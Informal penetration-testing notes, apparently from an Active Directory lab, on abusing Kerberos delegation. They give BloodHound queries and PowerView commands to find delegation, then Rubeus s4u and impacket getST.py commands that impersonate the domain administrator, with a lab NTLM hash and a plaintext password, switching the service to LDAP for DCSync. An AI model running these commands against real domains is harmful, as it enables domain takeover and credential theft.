

enumerate initially in bloodhound with the following

```
// Unconstrained Delegation
MATCH (c {unconstraineddelegation:true}) return c

// Constrained Delegation (with Protocol Transition)
MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=true return c

// Constrained Delegation (without Protocol Transition)
MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=false return c

// Resource-Based Constrained Delegation
MATCH p=(u)-[:AllowedToAct]->(c) RETURN p
```

or to enumerate on host

```powershell
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
```

so this powerview command shows us what we can delegate to, specifically what service too as this is an essential ESSENTTIALLL piece of information

```
PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

userprincipalname name           msds-allowedtodelegateto
----------------- ----           ------------------------
                  DCORP-ADMINSRV {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}

```


remember that the SPN part is not encrypted, what does that mean? it means that you can change the flag to whatever you want using the `/altservice:` flag, so from this `TIME` I can turn it into a `CIFS` attack which makes my life 10x easier, in this case i turned it into LDAP so I can DCsync




# Windows
after we know what the services we use the `s4u` flag in rubeus

```
 .\Rubeus.exe s4u /nowrap /msdsspn:"TIME/dcorp-DC.DOLLARCORP.MONEYCORP.LOCAL" /impersonateuser:"administrator" /domain:"DOLLARCORP.MONEYCORP.LOCAL" /user:"DCORP-ADMINSRV$" /rc4:"b5f451985fd34d58d5120816d31b5565" /altservice:ldap /ptt
```

# Linux

```
getST.py -spn "cifs/DC.painters.htb" -impersonate "administrator" 'painters.htb/blake:Fuckyou123$!#'
```

